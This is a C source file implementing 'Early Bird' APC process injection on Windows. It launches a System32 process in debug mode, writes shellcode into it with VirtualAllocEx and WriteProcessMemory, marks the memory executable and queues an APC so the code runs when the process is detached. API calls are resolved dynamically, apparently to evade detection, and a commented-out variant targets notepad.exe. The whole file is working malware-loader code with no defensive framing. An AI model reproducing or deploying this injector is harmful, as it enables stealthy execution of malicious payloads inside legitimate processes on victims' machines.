#include <windows.h> 
#include <stdio.h>
//#include "../auxiliary/helpers.h"
//#include "../auxiliary/syscalls.h"

#ifdef VERBOSE
#define DBG(...) printf(__VA_ARGS__ "\n")
#else
#define DBG(...)
#endif

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

typedef BOOL(WINAPI* CreateProcessAFunctionPointer)(
    LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
        );

typedef LPVOID(WINAPI* VirtualAllocExFunctionPointer)(
 HANDLE hProcess,
 LPVOID lpAddress,
 SIZE_T dwSize,
 DWORD  flAllocationType,
 DWORD  flProtect
);

typedef BOOL(WINAPI* WriteProcessMemoryFunctionPointer)(
 HANDLE  hProcess,
 LPVOID  lpBaseAddress,
 LPCVOID lpBuffer,
 SIZE_T  nSize,
 SIZE_T  *lpNumberOfBytesWritten
);

typedef DWORD(WINAPI* QueueUserAPCFunctionPointer)(
 PAPCFUNC  pfnAPC,
 HANDLE    hThread,
 ULONG_PTR dwData
);

typedef DWORD(WINAPI* ResumeThreadFunctionPointer)(
 HANDLE hThread
);

typedef BOOL(WINAPI* VirtualProtectExFunctionPointer)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);

typedef DWORD(WINAPI* GetEnvironmentVariableAFunctionPointer)(
  LPCSTR lpName,
  LPSTR  lpBuffer,
  DWORD  nSize
);

typedef BOOL(WINAPI* DebugActiveProcessStopFunctionPointer)(
 DWORD dwProcessId
);

/*
	inject the input payload into 'hProcess' and return the base address of where did the payload got written
*/
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = 0;
	DWORD	dwOldProtection = 0;
    
    HMODULE hkdll = HlpGetModuleHandle(L"Kernel32.dll");
    
    //VirtualAllocExFunctionPointer pValloc = (VirtualAllocExFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "VirtualAllocEx");
    
    VirtualAllocExFunctionPointer pValloc = (VirtualAllocExFunctionPointer)HlpGetProcAddress(hkdll, "VirtualAllocEx");
	*ppAddress = pValloc(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		//DBG("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	WriteProcessMemoryFunctionPointer pWrite = (WriteProcessMemoryFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "WriteProcessMemory");
	if (!pWrite(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		//DBG("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	VirtualProtectExFunctionPointer pVirtualProtectEx = (VirtualProtectExFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "VirtualProtectEx");
	if (!pVirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		//DBG("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    
	return TRUE;
}


/*
Parameters:
	- lpProcessName; a process name under '\System32\' to create
	- dwProcessId;  Pointer to a DWORD which will recieve the newly created process's PID.
	- hProcess; Pointer to a HANDLE that will recieve the newly created process's handle.
	- hThread; Pointer to a HANDLE that will recieve the newly created process's thread.

Creates a new process 'lpProcessName' in suspended state and return its pid, handle, and the handle of its main thread
*/
BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR					lpPath		[MAX_PATH * 2];
	CHAR					WnDr		[MAX_PATH];

	STARTUPINFO				Si			= { 0 };
	PROCESS_INFORMATION		Pi			= { 0 };

	// cleaning the structs 
	
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the %WINDIR% environment variable path (this is usually 'C:\Windows')
	GetEnvironmentVariableAFunctionPointer pGetEnvVariable = (GetEnvironmentVariableAFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "GetEnvironmentVariableA");
   
	if (!pGetEnvVariable("WINDIR", WnDr, MAX_PATH)) {
		//DBG("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    
	// Creating the target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	//DBG("\n\t[i] Running : \"%s\" ... ", lpPath);

	CreateProcessAFunctionPointer pCreate = (CreateProcessAFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "CreateProcessA");

	if (!pCreate(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Substitute of CREATE_SUSPENDED		
		NULL,
		NULL,
		&Si,
		&Pi)) 
        {
        DBG("[-] Something failed with CreatePRocessA");
		return FALSE;
	}

	/*
		{	both CREATE_SUSPENDED & DEBUG_PROCESS will work,
			CREATE_SUSPENDED will need ResumeThread, and
			DEBUG_PROCESS will need DebugActiveProcessStop
			to resume the execution
		}
	*/
	DBG("[+] DONE \n");

	// Populating the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL)
		return TRUE;
	
	return FALSE;
}

INT
EarlyBird(
    LPCSTR lpProcessName,
    LPVOID pBytes, 
    SIZE_T size
    ){
	HANDLE		hProcess		= NULL,
				hThread			= NULL;

	DWORD		dwProcessId		= 0;

	PVOID		pAddress		= NULL;
/*
    STARTUPINFOA si = {0};
	PROCESS_INFORMATION pi = {0};
	CreateProcessAFunctionPointer pCreate = (CreateProcessAFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "CreateProcessA");
	if (!pCreate("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)){
        DBG("[-] Something failed with CreatePRocessA");
		return FALSE;
	}
    DBG("[+] Created Process in Suspended State \n");

	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

    VirtualAllocExFunctionPointer pValloc = (VirtualAllocExFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "VirtualAllocEx");
    WriteProcessMemoryFunctionPointer pWrite = (WriteProcessMemoryFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "WriteProcessMemory");
    QueueUserAPCFunctionPointer pQueue = (QueueUserAPCFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "QueueUserAPC");
    ResumeThreadFunctionPointer pResume = (ResumeThreadFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "ResumeThread");

    LPVOID shellAddress = pValloc(victimProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    pWrite(victimProcess, shellAddress, pBytes, size, NULL);
	pQueue((PAPCFUNC)apcRoutine, threadHandle, NULL);	
	pResume(threadHandle);
*/
//	creating target remote process (in debugged state)
	//DBG("[i] Creating \"%s\" Process As A Debugged Process ... ", TARGET_PROCESS);
	if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		DBG("[-] Couldn't make process");
        return -1;
	}
	//DBG("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	DBG("[+] DONE \n\n");


// injecting the payload and getting the base address of it
	DBG("[i] Writing Shellcode To The Target Process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, pBytes, size, &pAddress)) {
		return -1;
	}
	DBG("[+] DONE \n\n");

//	running QueueUserAPC
	QueueUserAPCFunctionPointer pQueue = (QueueUserAPCFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "QueueUserAPC");

	pQueue((PTHREAD_START_ROUTINE)pAddress, hThread, 0);

//	since 'CreateSuspendedProcess2' create a process in debug mode,
//	we need to 'Detach' to resume execution; we do using `DebugActiveProcessStop`   
	DBG("[i] Detaching The Target Process ... ");
	DebugActiveProcessStopFunctionPointer pDebugStop = (DebugActiveProcessStopFunctionPointer)GetProcAddress(LoadLibraryA("Kernel32.dll"), "DebugActiveProcessStop");

	pDebugStop(dwProcessId);
	DBG("[+] DONE WITH EARLYBIRD \n\n");

	//DBG("[#] Press <Enter> To Quit ... ");
	//getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}